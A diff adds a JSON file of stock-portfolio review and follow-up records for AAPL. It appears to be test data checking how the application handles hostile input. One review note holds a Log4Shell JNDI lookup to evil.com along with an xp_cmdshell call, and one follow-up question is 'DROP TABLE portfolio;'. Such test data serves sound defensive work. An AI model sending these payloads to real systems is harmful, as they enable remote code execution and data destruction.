@@ -1,0 +1,79 @@
+{
+  "reviews": [
+    {
+      "reviewId": "REV-AAPL-1788656813181",
+      "attentionId": "ATT-DEDUP",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "REVIEW",
+      "recommendedAction": "REVIEW_POSITION",
+      "notes": [],
+      "createdAt": "2026-09-06T01:06:53.181Z",
+      "updatedAt": "2026-09-06T01:06:53.181Z"
+    },
+    {
+      "reviewId": "REV-AAPL-1788656813175",
+      "attentionId": "ATT-02",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "RESOLVED",
+      "recommendedAction": "REVIEW_POSITION",
+      "notes": [
+        {
+          "text": "Investigating Q3 10-Q filing",
+          "addedAt": "2026-09-06T01:06:53.176Z"
+        },
+        {
+          "text": "Analyst approved adjustment",
+          "addedAt": "2026-09-06T01:06:53.176Z"
+        }
+      ],
+      "createdAt": "2026-09-06T01:06:53.175Z",
+      "updatedAt": "2026-09-06T01:06:53.176Z"
+    },
+    {
+      "reviewId": "REV-AAPL-1788656813159",
+      "attentionId": "ATT-01",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "REVIEW",
+      "recommendedAction": "REVIEW_POSITION",
+      "notes": [
+        {
+          "text": "${jndi:ldap://evil.com/a} EXEC xp_cmdshell",
+          "addedAt": "2026-09-06T01:06:53.159Z"
+        }
+      ],
+      "createdAt": "2026-09-06T01:06:53.159Z"
+    },
+    {
+      "reviewId": "REV-AAPL-1788656813155",
+      "attentionId": "ATT-EXIT-01",
+      "ticker": "AAPL",
+      "urgency": "HIGH",
+      "status": "REVIEW",
+      "recommendedAction": "CONSIDER_EXIT",
+      "notes": [
+        {
+          "text": "Thesis broken due to governance defect",
+          "addedAt": "2026-09-06T01:06:53.155Z"
+        }
+      ],
+      "createdAt": "2026-09-06T01:06:53.155Z"
+    }
+  ],
+  "followUps": [
+    {
+      "followUpId": "FUP-AAPL-1788656813157-447",
+      "ticker": "AAPL",
+      "attentionId": "ATT-AAPL-DIRECT",
+      "question": "DROP TABLE portfolio;",
+      "status": "INVESTIGATING",
+      "assignedTo": "ANALYST",
+      "notes": [],
+      "findings": null,
+      "createdAt": "2026-09-06T01:06:53.157Z",
+      "updatedAt": "2026-09-06T01:06:53.157Z"
+    }
+  ]
+}
